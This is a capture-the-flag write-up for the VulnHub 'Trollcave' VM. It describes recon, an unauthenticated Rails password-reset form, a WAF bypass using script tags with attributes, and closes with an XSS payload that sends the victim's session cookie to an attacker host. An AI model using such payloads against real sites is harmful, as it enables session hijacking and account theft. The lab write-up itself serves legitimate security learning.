# TrollCave

Trollcave is a VM available from [VulnHub](https://www.vulnhub.com/entry/trollcave-12,230/) - a  "vulnerable VM, in the tradition of Vulnhub and infosec wargames in general. You start with a virtual machine which you know nothing about – no usernames, no passwords, just what you can see on the network."

As with many traditional wargaming VMs, your objective is simple: gain access to the root account and retrieve a flag to prove you did it. Although it didn't offer a great many surprises, I found it pretty enjoyable. What follows is a write-up of my experience of trying to exploit this VM. It's not exhaustive documentation - from my understanding, there are more than a couple ways to go about exploiting this VM.

## Getting Started

After importing and setting up the VM on a host-only network and confirming that it had obtained an IP address properly, I was ready to begin poking at it. Knowing nothing about the system or what I was in for, I started with a simple netdiscover to find it on the local network, followed by a quick NMap scan to see which ports are open.

The results were pretty simple: two services accessible to the outside world on ports 22 and 80. After examining the OpenSSH running on port 22 and concluding that I wouldn't find an easy way in there, I proceeded to the webserver. It's a fairly simple community blogging platform running Rails, complete with the kind of humour we've come to expect from CTF challenges ("God himself cannot hack this website. - dragon, site admin"). There's a lot going on here, but very little is accessible without an account - which is problematic, since registration seems to be closed. The first step, then, is to get our hands on one.

## Escalating from Guest User

This challenge relies heavily on its hints, especially in the web app exploitation phase. Pretty much every stage includes some kind of hint in the form of a blog post. Some of them were red herrings (unless I missed something), but I'll cover that later. The interesting tidbit that leads you to your first win is a blog post about password resets by "coderguy", the site developer. He doesn't tell you exactly where to look for the password reset functionality - and there's no links to it anywhere. What he does say, however, is that there is a `password_resets` resource in use.

A little bit of intuition or an understanding of the way Ruby on Rails resources are set up is required here. The resource he's referring to is at `/password_resets/new`. Here we'll find a lovely unauthenticated form that lets us reset the password of any regular user - moderators and admins are out of our grasp, but this was enough for me to reset the password of 'xer', one of the regular members on the site.

## Escalating from Regular Member

While I was doing this challenge, I was very focussed on a particular comment made by King, the site superadmin:

`I promise to read every blog restricted to my access level, no matter how creepy. `

See, every user has the ability to create blogs, and every blog has an access level. Regular users only have access levels 0 and 1; which are "everyone can see it" and "only members can see it", respectively. King has an access level of 5, but a regular user can't create a blog at that level - not even by fiddling with the POST parameters, as I found out. In the end, making a level 5 blog and performing a client-side attack wasn't the answer, but it kept me going for a good while.

Either way, the next step for me was to get one of those fancy moderator accounts. Besides King, one other user had dropped a hint about monitoring the website - "cooldude89", a Moderator user. He had created a thread about politics and religion, and promised to constantly watch it to make sure no trolls derail the debate. Taking this as an invitation for a client side attack, I set about searching for XSS.

Although there is a rudimentary WAF in place, circumventing it didn't take much. The `<script>` tag is filtered out of any post or comment, but all you need to do is include an attribute (i.e. `<script id=test>`) and it will go through. After some tinkering, I deduced that the session cookie is not protected in any way, and that stealing it will let you hijack a user's session - even if they click the logout button. To that end, I crafted the following XSS injection:

`
<SCRIPT id=test>document.write('<img src="http://192.168.56.1/collect.gif?cookie=' + document.cookie + '" />')</SCRIPT>
`
